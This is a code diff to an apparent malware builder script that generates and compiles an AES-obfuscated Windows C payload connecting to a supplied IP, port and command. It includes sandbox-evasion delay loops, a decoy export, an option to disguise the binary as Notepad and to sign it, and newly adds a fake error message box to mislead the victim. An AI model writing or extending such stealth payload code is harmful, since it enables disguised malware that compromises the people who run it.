@@ -31,7 +31,7 @@ def encrypt_bytes(text):
 def xor_string(s, xor_key=0x55):
     return ''.join(f'\\x{ord(c) ^ xor_key:02x}' for c in s)
 
-def generate_payload_c(ip, cmd, port, notepad=False):
+def generate_payload_c(ip, cmd, port, notepad=False, gui=False):
     ip_enc = encrypt_bytes(ip)
     cmd_enc = encrypt_bytes(cmd)
 
@@ -51,7 +51,7 @@ def generate_payload_c(ip, cmd, port, notepad=False):
 #include <windows.h>
 #include <stdio.h>
 #include "aes.h"
-
+{"#pragma comment(lib, \"user32\")" if gui else ""}
 #pragma comment(lib, "ws2_32")
 
 __declspec(dllexport) void LegitEntryPoint() {{}}
@@ -98,6 +98,7 @@ void aes_decrypt_string(uint8_t* encrypted, char* output) {{
 }}
 
 int main() {{
+    {"MessageBoxA(NULL, \"The executable did not start correctly.\", \"Error\", MB_OK | MB_ICONERROR);" if gui else ""}
     for (volatile int i = 0; i < 50000000; i++) {{}}
 
     char ip[16], cmd[16];
@@ -152,13 +153,14 @@ int main() {{
         return 1;
 
     return 0;
-}}''')
+}}
+''')
 
     print("[+] payload.c generated.")
 
     if notepad:
         with open("notepad.rc", "w") as rc:
-            rc.write(f'''
+            rc.write('''
 id ICON "notepad.ico"
 
 1 VERSIONINFO
@@ -224,8 +226,6 @@ def compile_payload(notepad=False, keep=False, sign=False):
         else:
             print("[*] --keep option enabled: temporary files kept.")
 
-# ...
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Stealth AES payload + compiled generation")
     parser.add_argument("--ip", required=True, help="IP address to encrypt")
@@ -234,8 +234,9 @@ if __name__ == "__main__":
     parser.add_argument("--notepad", action="store_true", help="Fake notepad with icon and metadata")
     parser.add_argument("--keep", action="store_true", help="Keep temporary files")
     parser.add_argument("--sign", action="store_true", help="Sign the executable using sign_exe.py")
+    parser.add_argument("--gui", action="store_true", help="Show a fake error message before execution")
 
     args = parser.parse_args()
 
-    generate_payload_c(args.ip, args.cmd, args.port, args.notepad)
+    generate_payload_c(args.ip, args.cmd, args.port, args.notepad, args.gui)
     compile_payload(args.notepad, args.keep, args.sign)
